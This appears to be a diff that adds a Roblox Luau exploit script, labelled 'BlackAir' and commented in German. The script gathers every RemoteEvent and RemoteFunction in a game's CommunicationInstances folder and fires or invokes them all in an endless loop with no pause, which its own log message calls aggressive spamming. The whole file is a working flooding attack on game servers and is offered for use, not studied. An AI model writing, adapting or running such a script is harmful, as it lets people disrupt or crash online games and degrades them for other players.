@@ -1,0 +1,38 @@
+-- CommunicationInstances abrufen
+local CommunicationInstances = game:GetService("ReplicatedStorage"):FindFirstChild("CommunicationInstances")
+
+if not CommunicationInstances then
+    print("[BlackAir]: CommunicationInstances not found!")
+    return
+end
+
+-- Alle Remote Events/Functionen sammeln
+local allRemotes = {}
+
+for _, child in pairs(CommunicationInstances:GetChildren()) do
+    if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
+        table.insert(allRemotes, child)
+        print("[BlackAir]: Found remote:", child.Name, "- Type:", child.ClassName)
+    end
+end
+
+if #allRemotes == 0 then
+    print("[BlackAir]: No RemoteEvents or RemoteFunctions found!")
+    return
+end
+
+print(string.format("[BlackAir]: STARTED AGGRESSIVE SPAMMING %d remotes!", #allRemotes))
+
+-- Aggressiver Spam ohne Pause
+while true do
+    for _, remote in pairs(allRemotes) do
+        pcall(function()
+            if remote:IsA("RemoteEvent") then
+                remote:FireServer()
+            elseif remote:IsA("RemoteFunction") then
+                remote:InvokeServer()
+            end
+        end)
+    end
+    -- Keine Pause - so schnell wie möglich
+end
